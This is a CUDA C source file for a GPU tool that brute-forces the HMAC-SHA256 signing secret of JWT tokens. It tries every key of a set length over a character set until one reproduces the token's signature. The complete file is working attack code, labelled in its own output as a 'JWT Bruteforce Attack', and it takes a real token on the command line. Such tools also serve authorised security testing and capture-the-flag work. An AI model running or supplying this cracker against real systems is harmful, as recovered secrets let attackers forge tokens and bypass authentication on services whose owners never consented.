#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include <getopt.h>

// SHA-256 constants
#define SHA256_BLOCK_SIZE 64
#define SHA256_DIGEST_SIZE 32

// Default limits
#define MAX_KEY_LENGTH 32
#define MAX_JWT_LENGTH 2048
#define MAX_CHARSET_SIZE 256

// --- Base64URL Decoding ---
__host__ int base64url_decode(const char* input, unsigned char* output, size_t* output_len) {
    static const char base64url_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    static int decode_table[256] = {-1};
    static bool table_initialized = false;
    
    // Initialize decode table once
    if (!table_initialized) {
        for (int i = 0; i < 256; i++) decode_table[i] = -1;
        for (int i = 0; i < 64; i++) {
            decode_table[(unsigned char)base64url_chars[i]] = i;
        }
        table_initialized = true;
    }
    
    size_t input_len = strlen(input);
    size_t i = 0, j = 0;
    
    while (i < input_len) {
        // Get 4 input characters (or fewer for last group)
        int pad = 0;
        unsigned char in[4] = {0};
        
        for (int k = 0; k < 4 && i < input_len; k++, i++) {
            if (input[i] == '=') {
                pad++;
                in[k] = 0;
            } else {
                int val = decode_table[(unsigned char)input[i]];
                if (val == -1) return -1; // Invalid character
                in[k] = val;
            }
        }
        
        // Decode the group
        if (j < 256) output[j++] = (in[0] << 2) | (in[1] >> 4);
        if (pad < 2 && j < 256) output[j++] = (in[1] << 4) | (in[2] >> 2);
        if (pad < 1 && j < 256) output[j++] = (in[2] << 6) | in[3];
    }
    
    *output_len = j;
    return 0;
}

// --- SHA-256 Device Functions ---
__device__ const uint32_t K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

__device__ uint32_t ROTR(uint32_t x, uint32_t n) {
    return (x >> n) | (x << (32 - n));
}

__device__ uint32_t CH(uint32_t x, uint32_t y, uint32_t z) {
    return (x & y) ^ (~x & z);
}

__device__ uint32_t MAJ(uint32_t x, uint32_t y, uint32_t z) {
    return (x & y) ^ (x & z) ^ (y & z);
}

__device__ uint32_t EP0(uint32_t x) {
    return ROTR(x, 2) ^ ROTR(x, 13) ^ ROTR(x, 22);
}

__device__ uint32_t EP1(uint32_t x) {
    return ROTR(x, 6) ^ ROTR(x, 11) ^ ROTR(x, 25);
}

__device__ uint32_t SIG0(uint32_t x) {
    return ROTR(x, 7) ^ ROTR(x, 18) ^ (x >> 3);
}

__device__ uint32_t SIG1(uint32_t x) {
    return ROTR(x, 17) ^ ROTR(x, 19) ^ (x >> 10);
}

__device__ void sha256_transform(uint32_t state[8], const unsigned char block[64]) {
    uint32_t a, b, c, d, e, f, g, h, i, j, t1, t2, m[64];

    for (i = 0, j = 0; i < 16; ++i, j += 4) {
        m[i] = (block[j] << 24) | (block[j + 1] << 16) | (block[j + 2] << 8) | (block[j + 3]);
    }
    
    for (; i < 64; ++i) {
        m[i] = SIG1(m[i - 2]) + m[i - 7] + SIG0(m[i - 15]) + m[i - 16];
    }

    a = state[0];
    b = state[1];
    c = state[2];
    d = state[3];
    e = state[4];
    f = state[5];
    g = state[6];
    h = state[7];

    for (i = 0; i < 64; ++i) {
        t1 = h + EP1(e) + CH(e, f, g) + K[i] + m[i];
        t2 = EP0(a) + MAJ(a, b, c);
        h = g;
        g = f;
        f = e;
        e = d + t1;
        d = c;
        c = b;
        b = a;
        a = t1 + t2;
    }

    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
    state[4] += e;
    state[5] += f;
    state[6] += g;
    state[7] += h;
}

__device__ void sha256_init(uint32_t state[8]) {
    state[0] = 0x6a09e667;
    state[1] = 0xbb67ae85;
    state[2] = 0x3c6ef372;
    state[3] = 0xa54ff53a;
    state[4] = 0x510e527f;
    state[5] = 0x9b05688c;
    state[6] = 0x1f83d9ab;
    state[7] = 0x5be0cd19;
}

__device__ void sha256_update(uint32_t state[8], const unsigned char *data, size_t len, 
                            unsigned char *buffer, size_t *buffer_len, uint64_t *total_len) {
    size_t i;
    
    *total_len += len;
    
    for (i = 0; i < len; i++) {
        buffer[*buffer_len] = data[i];
        (*buffer_len)++;
        
        if (*buffer_len == 64) {
            sha256_transform(state, buffer);
            *buffer_len = 0;
        }
    }
}

__device__ void sha256_final(uint32_t state[8], unsigned char hash[32], 
                           unsigned char *buffer, size_t buffer_len, uint64_t total_len) {
    size_t i;
    
    buffer[buffer_len++] = 0x80;
    
    if (buffer_len > 56) {
        while (buffer_len < 64) {
            buffer[buffer_len++] = 0;
        }
        sha256_transform(state, buffer);
        buffer_len = 0;
    }
    
    while (buffer_len < 56) {
        buffer[buffer_len++] = 0;
    }
    
    uint64_t bit_len = total_len * 8;
    for (int i = 0; i < 8; i++) {
        buffer[63 - i] = (unsigned char)(bit_len >> (i * 8));
    }
    
    sha256_transform(state, buffer);
    
    for (i = 0; i < 8; i++) {
        hash[i * 4] = (unsigned char)(state[i] >> 24);
        hash[i * 4 + 1] = (unsigned char)(state[i] >> 16);
        hash[i * 4 + 2] = (unsigned char)(state[i] >> 8);
        hash[i * 4 + 3] = (unsigned char)state[i];
    }
}

// HMAC-SHA256 implementation
__device__ void gpu_hmac_sha256(
    const char* message, 
    int message_len, 
    const char* key, 
    int key_len, 
    unsigned char* output
) {
    unsigned char k_ipad[64];
    unsigned char k_opad[64];
    unsigned char tk[32];
    
    uint32_t inner_state[8];
    uint32_t outer_state[8];
    
    unsigned char inner_buffer[64];
    unsigned char outer_buffer[64];
    size_t inner_buffer_len = 0;
    size_t outer_buffer_len = 0;
    uint64_t inner_total_len = 0;
    uint64_t outer_total_len = 0;
    
    int i;
    
    if (key_len > 64) {
        uint32_t temp_state[8];
        unsigned char temp_buffer[64];
        size_t temp_buffer_len = 0;
        uint64_t temp_total_len = 0;
        
        sha256_init(temp_state);
        sha256_update(temp_state, (const unsigned char*)key, key_len, temp_buffer, &temp_buffer_len, &temp_total_len);
        sha256_final(temp_state, tk, temp_buffer, temp_buffer_len, temp_total_len);
        
        key = (const char*)tk;
        key_len = 32;
    }
    
    for (i = 0; i < 64; i++) {
        if (i < key_len) {
            k_ipad[i] = key[i] ^ 0x36;
            k_opad[i] = key[i] ^ 0x5c;
        } else {
            k_ipad[i] = 0x36;
            k_opad[i] = 0x5c;
        }
    }
    
    sha256_init(inner_state);
    sha256_update(inner_state, k_ipad, 64, inner_buffer, &inner_buffer_len, &inner_total_len);
    sha256_update(inner_state, (const unsigned char*)message, message_len, inner_buffer, &inner_buffer_len, &inner_total_len);
    sha256_final(inner_state, output, inner_buffer, inner_buffer_len, inner_total_len);
    
    sha256_init(outer_state);
    sha256_update(outer_state, k_opad, 64, outer_buffer, &outer_buffer_len, &outer_total_len);
    sha256_update(outer_state, output, 32, outer_buffer, &outer_buffer_len, &outer_total_len);
    sha256_final(outer_state, output, outer_buffer, outer_buffer_len, outer_total_len);
}

// --- GPU Kernel ---
__device__ void index_to_key(
    unsigned long long index, 
    int key_len,
    const char* charset, 
    int charset_size,
    char* output_key
) {
    output_key[key_len] = '\0';
    unsigned long long temp_index = index;

    for (int i = key_len - 1; i >= 0; --i) {
        output_key[i] = charset[temp_index % charset_size];
        temp_index /= charset_size;
    }
}

__global__ void bruteforce_kernel(
    const unsigned char* target_hash,
    const char* signing_input, 
    int signing_input_len,
    const char* charset,
    int charset_size,
    int key_length,
    unsigned long long batch_start,
    unsigned long long batch_size,
    int* found_flag,
    char* found_key
) {
    unsigned long long thread_idx = (unsigned long long)blockIdx.x * blockDim.x + threadIdx.x;

    if (thread_idx >= batch_size) {
        return;
    }
    
    unsigned long long key_index = batch_start + thread_idx;
    char candidate_key[MAX_KEY_LENGTH + 1];

    index_to_key(key_index, key_length, charset, charset_size, candidate_key);

    unsigned char computed_hash[32];

    gpu_hmac_sha256(signing_input, signing_input_len, 
                   candidate_key, key_length,
                   computed_hash);

    bool match = true;
    for (int i = 0; i < 32; ++i) {
        if (computed_hash[i] != target_hash[i]) {
            match = false;
            break;
        }
    }

    if (match) {
        if (atomicCAS(found_flag, 0, 1) == 0) {
            for(int i = 0; i < key_length; ++i) {
                found_key[i] = candidate_key[i];
            }
            found_key[key_length] = '\0';
        }
    }
}

// --- Configuration Structure ---
struct Config {
    char* jwt_token;
    char* charset;
    int min_key_length;
    int max_key_length;
    unsigned long long batch_size;
    int threads_per_block;
    bool verbose;
};

// --- Helper Functions ---
void print_usage(const char* program_name) {
    printf("Usage: %s -t <jwt_token> [options]\n", program_name);
    printf("\nOptions:\n");
    printf("  -t, --token <jwt>       JWT token to crack (required)\n");
    printf("  -c, --charset <chars>   Character set for bruteforce (default: a-zA-Z0-9-_!@#$*)\n");
    printf("  -m, --min <length>      Minimum key length (default: 1)\n");
    printf("  -M, --max <length>      Maximum key length (default: 8)\n");
    printf("  -b, --batch <size>      Batch size for GPU processing (default: 10000000)\n");
    printf("  -T, --threads <num>     Threads per block (default: 256)\n");
    printf("  -v, --verbose           Verbose output\n");
    printf("  -h, --help              Show this help message\n");
    printf("\nExample:\n");
    printf("  %s -t \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\"\n", program_name);
}

void parse_jwt(const char* jwt, char** header_payload, unsigned char** signature_bytes, size_t* signature_len) {
    char* jwt_copy = strdup(jwt);
    char* last_dot = strrchr(jwt_copy, '.');
    
    if (!last_dot) {
        fprintf(stderr, "Error: Invalid JWT format\n");
        exit(1);
    }
    
    *last_dot = '\0';
    *header_payload = strdup(jwt_copy);
    
    // Decode signature
    *signature_bytes = (unsigned char*)malloc(256);
    base64url_decode(last_dot + 1, *signature_bytes, signature_len);
    
    free(jwt_copy);
}

// --- Main Function ---
int main(int argc, char** argv) {
    Config config = {
        .jwt_token = NULL,
        .charset = strdup("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_!@#$*"),
        .min_key_length = 1,
        .max_key_length = 8,
        .batch_size = 10000000,
        .threads_per_block = 256,
        .verbose = false
    };
    
    // Parse command line arguments
    static struct option long_options[] = {
        {"token", required_argument, 0, 't'},
        {"charset", required_argument, 0, 'c'},
        {"min", required_argument, 0, 'm'},
        {"max", required_argument, 0, 'M'},
        {"batch", required_argument, 0, 'b'},
        {"threads", required_argument, 0, 'T'},
        {"verbose", no_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    while ((opt = getopt_long(argc, argv, "t:c:m:M:b:T:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 't':
                config.jwt_token = strdup(optarg);
                break;
            case 'c':
                free(config.charset);
                config.charset = strdup(optarg);
                break;
            case 'm':
                config.min_key_length = atoi(optarg);
                break;
            case 'M':
                config.max_key_length = atoi(optarg);
                break;
            case 'b':
                config.batch_size = strtoull(optarg, NULL, 10);
                break;
            case 'T':
                config.threads_per_block = atoi(optarg);
                break;
            case 'v':
                config.verbose = true;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    if (!config.jwt_token) {
        fprintf(stderr, "Error: JWT token is required\n");
        print_usage(argv[0]);
        return 1;
    }
    
    // Parse JWT
    char* header_payload;
    unsigned char* signature_bytes;
    size_t signature_len;
    parse_jwt(config.jwt_token, &header_payload, &signature_bytes, &signature_len);
    
    // Validate signature length
    if (signature_len != 32) {
        fprintf(stderr, "Error: Expected 32-byte SHA-256 signature, got %zu bytes\n", signature_len);
        free(header_payload);
        free(signature_bytes);
        free(config.charset);
        return 1;
    }
    
    if (config.verbose) {
        printf("JWT Bruteforce Attack Configuration:\n");
        printf("=====================================\n");
        printf("Header.Payload: %s\n", header_payload);
        printf("Signature length: %zu bytes\n", signature_len);
        printf("Charset: %s (%zu characters)\n", config.charset, strlen(config.charset));
        printf("Key length range: %d-%d\n", config.min_key_length, config.max_key_length);
        printf("Batch size: %llu\n", config.batch_size);
        printf("Threads per block: %d\n", config.threads_per_block);
        printf("=====================================\n\n");
    }
    
    // GPU Setup
    unsigned char* gpu_target_hash;
    char* gpu_signing_input;
    char* gpu_charset;
    int* gpu_found_flag;
    char* gpu_found_key;
    
    int charset_size = strlen(config.charset);
    int signing_input_len = strlen(header_payload);
    
    // Allocate GPU memory with error checking
    if (cudaMalloc(&gpu_target_hash, signature_len) != cudaSuccess) {
        fprintf(stderr, "Failed to allocate GPU memory for target hash\n");
        return 1;
    }
    if (cudaMalloc(&gpu_signing_input, signing_input_len) != cudaSuccess) {
        fprintf(stderr, "Failed to allocate GPU memory for signing input\n");
        return 1;
    }
    if (cudaMalloc(&gpu_charset, charset_size) != cudaSuccess) {
        fprintf(stderr, "Failed to allocate GPU memory for charset\n");
        return 1;
    }
    if (cudaMalloc(&gpu_found_flag, sizeof(int)) != cudaSuccess) {
        fprintf(stderr, "Failed to allocate GPU memory for found flag\n");
        return 1;
    }
    if (cudaMalloc(&gpu_found_key, MAX_KEY_LENGTH + 1) != cudaSuccess) {
        fprintf(stderr, "Failed to allocate GPU memory for found key\n");
        return 1;
    }
    
    // Copy data to GPU
    cudaMemcpy(gpu_target_hash, signature_bytes, signature_len, cudaMemcpyHostToDevice);
    cudaMemcpy(gpu_signing_input, header_payload, signing_input_len, cudaMemcpyHostToDevice);
    cudaMemcpy(gpu_charset, config.charset, charset_size, cudaMemcpyHostToDevice);
    
    // Initialize found flag
    int host_found_flag = 0;
    cudaMemcpy(gpu_found_flag, &host_found_flag, sizeof(int), cudaMemcpyHostToDevice);
    
    // Bruteforce attack
    for (int key_len = config.min_key_length; key_len <= config.max_key_length; key_len++) {
        printf("Attempting keys of length %d...\n", key_len);
        
        unsigned long long total_keys = 1;
        for (int i = 0; i < key_len; i++) {
            total_keys *= charset_size;
        }
        
        if (config.verbose) {
            printf("Total keys for length %d: %llu\n", key_len, total_keys);
        }
        
        unsigned long long keys_processed = 0;
        while (keys_processed < total_keys) {
            unsigned long long batch_size = min(config.batch_size, total_keys - keys_processed);
            
            int num_blocks = (batch_size + config.threads_per_block - 1) / config.threads_per_block;
            
            if (config.verbose) {
                printf("Processing batch: %llu-%llu (%.2f%%)\r", 
                      keys_processed, keys_processed + batch_size,
                      (double)(keys_processed + batch_size) * 100.0 / total_keys);
                fflush(stdout);
            }
            
            bruteforce_kernel<<<num_blocks, config.threads_per_block>>>(
                gpu_target_hash,
                gpu_signing_input, signing_input_len,
                gpu_charset, charset_size,
                key_len,
                keys_processed,
                batch_size,
                gpu_found_flag,
                gpu_found_key
            );
            
            cudaDeviceSynchronize();
            
            // Check if key was found
            cudaMemcpy(&host_found_flag, gpu_found_flag, sizeof(int), cudaMemcpyDeviceToHost);
            
            if (host_found_flag == 1) {
                char host_found_key[MAX_KEY_LENGTH + 1];
                cudaMemcpy(host_found_key, gpu_found_key, MAX_KEY_LENGTH + 1, cudaMemcpyDeviceToHost);
                
                printf("\n\nKEY FOUND: %s\n", host_found_key);
                printf("Key length: %zu\n", strlen(host_found_key));
                
                // Cleanup
                cudaFree(gpu_target_hash);
                cudaFree(gpu_signing_input);
                cudaFree(gpu_charset);
                cudaFree(gpu_found_flag);
                cudaFree(gpu_found_key);
                
                free(header_payload);
                free(signature_bytes);
                free(config.charset);
                
                return 0;
            }
            
            keys_processed += batch_size;
        }
        
        if (config.verbose) {
            printf("\n");
        }
    }
    
    printf("\nKey not found within specified parameters\n");
    
    // Cleanup
    cudaFree(gpu_target_hash);
    cudaFree(gpu_signing_input);
    cudaFree(gpu_charset);
    cudaFree(gpu_found_flag);
    cudaFree(gpu_found_key);
    
    free(header_payload);
    free(signature_bytes);
    free(config.charset);
    
    return 1;
}